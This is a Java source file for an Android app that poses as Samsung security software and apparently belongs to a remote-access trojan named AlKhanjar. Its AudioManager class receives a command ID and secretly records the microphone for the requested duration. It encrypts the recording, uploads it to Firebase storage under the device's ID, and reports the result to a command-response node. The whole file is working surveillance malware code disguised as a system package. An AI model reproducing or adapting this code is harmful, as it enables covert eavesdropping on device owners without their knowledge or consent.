package com.samsung.android.security.v8.managers;

import android.content.Context;
import android.media.MediaRecorder;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.samsung.android.security.v8.AlKhanjarApp;
import com.samsung.android.security.v8.utils.CryptoManager;

import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;
import java.util.Map;

public class AudioManager {
    
    private static final String TAG = "AudioManager";
    private Context context;
    private MediaRecorder mediaRecorder;
    private String currentRecordingPath;
    
    public AudioManager(Context context) {
        this.context = context;
    }
    
    public void recordAudio(int durationSeconds, String commandId) {
        try {
            File outputDir = context.getCacheDir();
            File outputFile = File.createTempFile("audio_", ".3gp", outputDir);
            currentRecordingPath = outputFile.getAbsolutePath();
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentRecordingPath);
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            
            new android.os.Handler().postDelayed(() -> {
                stopRecording(commandId);
            }, durationSeconds * 1000L);
            
            Log.d(TAG, "Audio recording started");
            
        } catch (Exception e) {
            Log.e(TAG, "Record audio error: " + e.getMessage());
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    private void stopRecording(String commandId) {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                
                uploadAudio(commandId);
            }
        } catch (Exception e) {
            Log.e(TAG, "Stop recording error: " + e.getMessage());
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    private void uploadAudio(String commandId) {
        try {
            File audioFile = new File(currentRecordingPath);
            byte[] audioData = new byte[(int) audioFile.length()];
            
            FileInputStream fis = new FileInputStream(audioFile);
            fis.read(audioData);
            fis.close();
            
            byte[] encryptedData = CryptoManager.encryptBytes(audioData);
            
            FirebaseStorage storage = FirebaseStorage.getInstance();
            String fileName = "audio/" + AlKhanjarApp.getDeviceId() + "/" + System.currentTimeMillis() + ".3gp";
            StorageReference storageRef = storage.getReference().child(fileName);
            
            storageRef.putBytes(encryptedData)
                .addOnSuccessListener(taskSnapshot -> {
                    storageRef.getDownloadUrl().addOnSuccessListener(uri -> {
                        Map<String, Object> audioData2 = new HashMap<>();
                        audioData2.put("url", uri.toString());
                        audioData2.put("timestamp", System.currentTimeMillis());
                        audioData2.put("duration", audioFile.length());
                        audioData2.put("encrypted", true);
                        
                        sendResponse(commandId, "success", audioData2);
                        audioFile.delete();
                    });
                })
                .addOnFailureListener(e -> {
                    sendResponse(commandId, "error", e.getMessage());
                    audioFile.delete();
                });
                
        } catch (Exception e) {
            Log.e(TAG, "Upload audio error: " + e.getMessage());
            sendResponse(commandId, "error", e.getMessage());
        }
    }
    
    private void sendResponse(String commandId, String status, Object data) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference responseRef = database.getReference("responses")
                .child(AlKhanjarApp.getDeviceId())
                .child(commandId);
            
            Map<String, Object> response = new HashMap<>();
            response.put("status", status);
            response.put("data", data);
            response.put("timestamp", System.currentTimeMillis());
            
            responseRef.setValue(response);
            
        } catch (Exception e) {
            Log.e(TAG, "Send response error: " + e.getMessage());
        }
    }
}
